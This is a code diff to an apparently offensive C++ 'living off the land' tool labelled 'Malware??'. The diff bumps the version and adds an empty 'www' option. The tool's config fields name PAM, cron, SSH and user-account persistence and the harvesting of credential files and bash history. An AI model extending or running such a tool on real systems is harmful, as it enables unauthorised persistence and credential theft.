@@ -41,7 +41,7 @@ void Init::welcome() {
           Malware??
 
 Author:  c0d3Ninja
-Version: v0.16
+Version: v0.17
 
 ========================================================
     )" << RESET << std::endl;
@@ -73,6 +73,7 @@ struct Config{
     std::vector<std::string> pam;
     std::vector<std::string> cron;
     std::vector<std::string> ssh;
+    std::vector<std::string> www;
     std::vector<std::string> user;
     std::vector<std::string> ip;
     std::vector<std::string> credPaths;
@@ -105,6 +106,7 @@ void Init::checkDependencies() {
     ParseConf.pam = parseDependencies("config/lotl.conf", "pam");
     ParseConf.cron = parseDependencies("config/lotl.conf", "cron");
     ParseConf.ssh = parseDependencies("config/lotl.conf", "ssh");
+    ParseConf.www = parseDependencies("config/lotl.conf", "www");
     ParseConf.user = parseDependencies("config/lotl.conf", "user");
     ParseConf.credPaths = parsePaths("config/lotl.conf", "checkCreds");
     ParseConf.bashHistory = parsePaths("config/lotl.conf", "checkBashHistory");
@@ -164,6 +166,12 @@ void Init::checkDependencies() {
                 if (resultPass != 0) {
                     std::cerr << RED << "Error adding password" << "\n";
                 }
+            }
+        }
+
+        for (const auto& www_ : ParseConf.www) {
+            if (www_ == "yes") {
+
             }
         }
     }
